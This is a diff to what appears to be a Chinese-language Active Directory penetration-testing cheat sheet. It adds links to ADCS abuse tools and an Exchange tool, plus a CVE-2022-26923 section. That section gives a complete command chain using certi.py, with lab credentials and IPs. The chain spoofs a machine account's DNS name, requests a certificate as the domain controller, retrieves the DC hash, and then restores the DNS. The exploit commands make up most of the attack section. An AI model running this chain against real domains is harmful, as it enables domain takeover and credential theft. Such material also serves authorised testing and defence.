@@ -139,6 +139,8 @@ Table of Contents
             * [地址解析协议](#地址解析协议)
             * [Zerologon](#ZeroLogon)
             * [noPac](#nopac)
+            * [ADCS](#ADCS)
+            * [CVE-2022-26923](#CVE-2022-26923)
         * [获取AD哈希](#获取ad哈希)
         * [AD持久化](#ad持久化)
             * [活动目录持久性技巧](#活动目录持久性技巧)
@@ -1584,6 +1586,34 @@ Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute 
 
 一键利用：[noPac](https://github.com/cube0x0/noPac)
 
+##### ADCS
+利用ADCS中错误配置的模板进行域提权，详细可参考：[Certified_Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
+
+可利用工具：
+
+* [Certify](https://github.com/GhostPack/Certify)
+* [Certipy](https://github.com/ly4k/Certipy)
+* [PKINITtools](https://github.com/dirkjanm/PKINITtools)
+* [certi](https://github.com/eloypgz/certi)
+
+##### CVE-2022-26923
+前提：域内有ADCS
+Exploit:
+```
+# 修改可控机器DNS
+python certi.py account create cgdomain.com/sanfeng:'1qazXSW@'@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns dc2008.cgdomain.com
+
+# 请求证书
+python certi.py req 'cgdomain.com/testvul$:NUxhMemzaP4rsPnu'@10.211.55.200 -dc-ip 10.211.55.200 -ca cgdomain-DC2008-CA -template 'Machine'
+
+# 获取DC hash
+python certi.py auth -dc-ip 10.211.55.200 -pfx dc2008.pfx -username dc2008$
+
+# 还原机器DNS
+python certi.py account update cgdomain.com/sanfeng:'1qazXSW@'@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns testvul.hqcec.com
+```
+>注：此环境的ADCS与DC为同一台机器。真实环境需要根据实际情况进行参数调整。
+
 
 #### 获取AD哈希 
 * 使用VSS卷影副本 
@@ -1658,6 +1688,7 @@ http://www.vuln.cn/6812
 [SharpAddDomainMachine](https://github.com/Ridter/SharpAddDomainMachine
 )
 ##### Exchange的利用
+* [**owa_info**](https://github.com/ridter/owa_info)
 * [**Exchange2domain**](https://github.com/Ridter/Exchange2domain)
 * [**CVE-2018-8581**](https://github.com/WyAtu/CVE-2018-8581/)
 * [**CVE-2019-1040**](https://github.com/Ridter/CVE-2019-1040) 
